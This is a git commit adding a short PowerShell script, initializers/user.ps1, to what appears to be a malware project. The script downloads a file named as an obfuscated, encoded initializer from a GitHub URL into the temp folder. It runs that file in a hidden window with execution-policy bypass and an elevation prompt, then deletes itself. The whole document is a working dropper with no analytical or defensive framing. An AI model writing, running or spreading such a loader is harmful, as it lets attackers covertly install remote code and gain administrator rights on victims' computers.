3324ab3ac4f7650da21144e131c03b3a389bce46
soumyo001 <www.soumyo@gmail.com>
2025-05-23 02:01:16 +0600

    initializerx3

---
+++ initializers/user.ps1
@@ -0,0 +1,11 @@
+$currLoc = (Get-Location).Path
+$currLoc = "$currLoc\user.ps1"
+$init_uri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_encoded_initializer.ps1"
+$scriptPath = "$env:temp\initializer.ps1"
+
+iwr -Uri $init_uri -OutFile $scriptPath
+
+if(-not ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){
+    Start-Process powershell.exe -ArgumentList "-ep", "bypass", "-noP", "-w", "hidden", "-command", "$scriptPath" -Verb RunAs
+}
+Remove-Item -Path $currLoc -Force
